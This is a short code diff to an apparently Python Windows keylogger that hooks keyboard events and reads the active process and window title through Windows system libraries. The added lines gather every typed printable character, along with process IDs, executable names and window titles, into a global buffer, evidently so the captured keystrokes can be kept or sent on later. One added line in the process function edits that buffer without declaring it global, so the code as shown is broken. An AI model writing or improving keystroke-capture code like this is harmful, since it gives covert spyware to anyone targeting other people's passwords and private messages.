@@ -7,7 +7,7 @@ user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
-
+data = ""
 
 def get_current_process():
 
@@ -28,14 +28,14 @@ def get_current_process():
 
     #print("[*] In keyLog module")
     print("[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value))
-
+    data += "[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value)
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
 
 
 def KeyStroke(event):
 
-    global current_window
+    global current_window, data
 
     if event.WindowName != current_window:
         current_window = event.WindowName
@@ -43,6 +43,7 @@ def KeyStroke(event):
 
     if event.Ascii > 32 and event.Ascii < 127:
         print(chr(event.Ascii))
+        data += chr(event.Ascii)
     else:
 
         if event.Key == "V":
